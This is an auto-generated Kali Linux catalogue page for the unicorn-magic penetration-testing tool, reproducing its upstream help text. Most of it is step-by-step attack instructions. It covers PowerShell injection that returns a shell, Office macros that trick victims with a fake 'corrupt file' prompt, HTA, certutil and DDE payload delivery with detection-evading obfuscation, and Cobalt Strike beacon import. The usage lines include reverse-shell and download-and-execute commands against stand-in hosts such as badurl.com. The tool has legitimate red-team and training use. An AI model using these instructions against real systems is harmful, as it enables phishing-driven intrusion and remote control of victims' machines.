---
tool_id: unicorn-magic
title: unicorn-magic
categories: ["exploitation-tools"]
category_slugs: ["exploitation-tools"]
homepage: https://github.com/trustedsec/unicorn
repository: 
version: 3.12-0kali3
architectures: all
license: 
binaries: []
metapackages: ["kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-web"]
icon: /images/kali-tools-icon-missing.svg
source_path: kali-tools\unicorn-magic\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:07.153410
---

# Tool: unicorn-magic (unicorn-magic)

## Categories
- [exploitation-tools](../exploitation-tools.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn) |
| Repository |  |
| Version | 3.12-0kali3 |
| Architectures | all |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-web |
| Icon | /images/kali-tools-icon-missing.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/unicorn-magic
- **PackagesInfo**: |
- ****Installed size**: ** `99 KB`
- ****How to install**: ** `sudo apt install unicorn-magic`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# unicorn-magic --help


## Documentation (Upstream)
--POWERSHELL ATTACK INSTRUCTIONS----
 
 Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.
 
 Note that you will need to have a listener enabled in order to capture the attack.
 
 [*******************************************************************************************************]
 	
 
 [*******************************************************************************************************]
 
 				-----MACRO ATTACK INSTRUCTIONS----
 
 For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
 that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
 into that. This will automatically run. Note that a message will prompt to the user saying that the file
 is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is  tricking the
 victim to thinking the excel document is corrupted. You should get a shell through powershell injection
 after that.
 
 If you are deploying this against Office365/2016+ versions of Word you need 
 to modify the first line of the output from: Sub Auto_Open()
  
 To: Sub AutoOpen()
  
 The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme.
 
 NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
 REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
 HAPPEN!
 
 [*******************************************************************************************************]
 
 	
 
 [*******************************************************************************************************]
 
 				-----HTA ATTACK INSTRUCTIONS----
 
 The HTA attack will automatically generate two files, the first the index.html which tells the browser to
 use Launcher.hta which contains the malicious powershell injection code. All files are exported to the
 hta_access/ folder and there will be three main files. The first is index.html, second Launcher.hta and the
 last, the unicorn.rc (if metasploit was used) file. You can run msfconsole -r unicorn.rc to launch the listener 
 for Metasploit. If you didn't use Metasploit, only two files will be exported.
 
 A user must click allow and accept when using the HTA attack in order for the powershell injection to work
 properly.
 
 [*******************************************************************************************************]
 
 	
 
 [*******************************************************************************************************]
 
 				-----CERTUTIL Attack Instruction----
 
 The certutil attack vector was identified by Matthew Graeber (@mattifestation) which allows you to take
 a binary file, move it into a base64 format and use certutil on the victim machine to convert it back to
 a binary for you. This should work on virtually any system and allow you to transfer a binary to the victim
 machine through a fake certificate file. To use this attack, simply place an executable in the path of
 unicorn and run python unicorn.py <exe_name> crt in order to get the base64 output. Once that's finished,
 go to decode_attack/ folder which contains the files. The bat file is a command that can be run in a
 windows machine to convert it back to a binary.
 
 [*******************************************************************************************************]
 	
 
 [*******************************************************************************************************]
 
 				-----Custom PS1 Attack Instructions----
 
 This attack method allows you to convert any PowerShell file (.ps1) into an encoded command or macro.
 
 Note if choosing the macro option, a large ps1 file may exceed the amount of carriage returns allowed by
 VBA. You may change the number of characters in each VBA string by passing an integer as a parameter.
 
 Examples:
 
 python unicorn.py harmless.ps1
 python unicorn.py myfile.ps1 macro
 python unicorn.py muahahaha.ps1 macro 500
 
 The last one will use a 500 character string instead of the default 380, resulting in less carriage returns in VBA.
 
 [*******************************************************************************************************]
 	
 
 
 [*******************************************************************************************************]
 
                 -----DDE Office COM Attack Instructions----
 
 This attack vector will generate the DDEAUTO formulate to place into Word or Excel. The COM object 
 DDEInitilize and DDEExecute allow for formulas to be created directly within Office which causes the
 ability to gain remote code execution without the need of macros. This attack was documented and full
 instructions can be found at:
 
 https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
 
 In order to use this attack, run the following examples:
 
 python unicorn.py <payload> <lhost> <lport> dde
 python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
 
 Once generated, a powershell_attack.txt will be generated which contains the Office code, and the
 unicorn.rc file which is the listener component which can be called by msfconsole -r unicorn.rc to
 handle the listener for the payload. In addition a download.ps1 will be exported as well (explained
 in the latter section).
 
 In order to apply the payload, as an example (from sensepost article):
 
 1. Open Word
 2. Insert tab -> Quick Parts -> Field
 3. Choose = (Formula) and click ok.
 4. Once the field is inserted, you should now see "!Unexpected End of Formula"
 5. Right-click the Field, choose "Toggle Field Codes"
 6. Paste in the code from Unicorn
 7. Save the Word document.
 
 Once the office document is opened, you should receive a shell through powershell injection. Note
 that DDE is limited on char size and we need to use Invoke-Expression (IEX) as the method to download.
 
 The DDE attack will attempt to download download.ps1 which is our powershell injection attack since
 we are limited to size restrictions. You will need to move the download.ps1 to a location that is
 accessible by the victim machine. This means that you need to host the download.ps1 in an Apache2
 directory that it has access to.
 
 You may notice that some of the commands use "{ QUOTE" these are ways of masking specific commands
 which is documented here: http://staaldraad.github.io/2017/10/23/msword-field-codes/. In this case
 we are changing WindowsPowerShell, powershell.exe, and IEX to avoid detection. Also check out the URL
 as it has some great methods for not calling DDE at all.
 
 [*******************************************************************************************************]
     
 
 [*******************************************************************************************************]
 
                 -----Import Cobalt Strike Beacon----
 
 This method will import direct Cobalt Strike Beacon shellcode directly from Cobalt Strike.
 
 Within Cobalt Strike, export the Cobalt Strike "CS" (C#) export and save it to a file. For example, call 
 the file, cobalt_strike_file.cs. 
 
 The export code will look something like this:
 
 * length: 836 bytes */
 byte[] buf = new byte[836] { 0xfc, etc
 
 Next, for usage:
 
 python unicorn.py cobalt_strike_file.cs cs
 
 The cs argument tells Unicorn that you want to use the Cobalt strike functionality. The rest is Magic.
 
 Next simply copy the powershell command to something you have the ability for remote command execution.
 
 NOTE: THE FILE MUST BE EXPORTED IN THE C# (CS) FORMAT WITHIN COBALT STRIKE TO PARSE PROPERLY.
 
 There are some caveats with this attack. Note that the payload size will be a little over 14k+ in byte
 size. That means that from a command line argument perspective if you copy and paste you will hit the
 8191 character size restriction (hardcoded into cmd.exe). If you are launching directly from cmd.exe
 this is an issue, however if you are launching directly from PowerShell or other normal applications
 this is a non-problem.
 
 A couple examples here, wscript.shell and powershell uses USHORT - 65535 / 2 = 32767 size limit:
 
 typedef struct _UNICODE_STRING {
     USHORT Length;
     USHORT MaximumLength;
     PWSTR  Buffer;
 } UNICODE_STRING;
 
 For this attack if you are launching directly from powershell, VBSCript (WSCRIPT.SHELL), there is no
 issues.
 
 [*******************************************************************************************************]
     
 -------------------- Magic Unicorn Attack Vector v3.12 -----------------------------
 
 Native x86 powershell injection attacks on any Windows platform.
 Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
 Twitter: @TrustedSec, @HackingDave
 Credits: Matthew Graeber, Justin Elze, Chris Gates
 
 Happy Magic Unicorns.
 
 Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
 PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
 PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
 PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro
 Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
 Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
 HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
 HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms
 HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
 HTA Example SettingContent-ms: python unicorn.py <cobalt_strike_file.cs cs ms
 HTA Example SettingContent-ms: python unicorn.py <patth_to_shellcode.txt>: shellcode ms
 DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
 CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
 Custom PS1 Example: python unicorn.py <path to ps1 file>
 Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
 Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
 Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00 or metasploit)
 Custom Shellcode HTA: python unicorn.py <path_to_shellcode.txt> shellcode hta (formatted 0x00 or metasploit)
 Custom Shellcode Macro: python unicorn.py <path_to_shellcode.txt> shellcode macro (formatted 0x00 or metasploit)
 Generate .SettingContent-ms: python unicorn.py ms
 Help Menu: python unicorn.py --help
 
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}


## Source
- Path: kali-tools\unicorn-magic\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:07.153410
